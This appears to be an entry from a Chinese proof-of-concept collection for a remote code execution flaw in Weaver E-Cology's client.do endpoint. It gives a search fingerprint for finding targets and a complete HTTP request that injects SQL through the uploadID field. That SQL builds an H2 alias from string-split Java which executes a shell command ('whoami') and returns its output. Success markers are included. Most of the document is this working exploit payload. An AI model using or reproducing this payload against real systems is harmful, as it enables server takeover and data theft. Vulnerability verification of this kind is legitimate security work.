﻿# 泛微E-Cology client.do RCE漏洞

> 更新时间：2024-04-16

> 漏洞编号：

> 漏洞说明：泛微E-Cology client.do存在RCE漏洞 ，远程代码执行漏洞,恶意攻击者可能利用此漏洞执行恶意命令，获取服务器敏感信息，最终可能导致服务器失陷。

> 漏洞特征：app="泛微-EMobile"

> 验证脚本：HTTP

```
POST /client.do HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
Cookie: JSESSIONID=abcZRb929ZuHEdfjFEAMy
Content-Type: multipart/form-data; boundary=----HJGJjgvfIUGVYHVvfytfvkgvuy
Content-Length: 1151

------HJGJjgvfIUGVYHVvfytfvkgvuy
Content-Disposition: form-data; name="method"

getupload
------HJGJjgvfIUGVYHVvfytfvkgvuy
Content-Disposition: form-data; name="uploadID"

1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws
java.la','ng.Exception{','Object curren','tRequest =
Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.ser
ver.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java
.la','ng.reflect.Field _responseF =
currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_respo
nseF.setAcce','ssible(true);Object response =
_responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM =
response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer =
(java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner =
(new
java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useD
elimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL
MzSNqKsZTagmf('whoami');--
------HJGJjgvfIUGVYHVvfytfvkgvuy--
```

> 响应代码特征：200

> 响应内容特征：system

> 上传文件定位：

> 验证文件来源：泛微E-Cology client.do RCE漏洞.poc

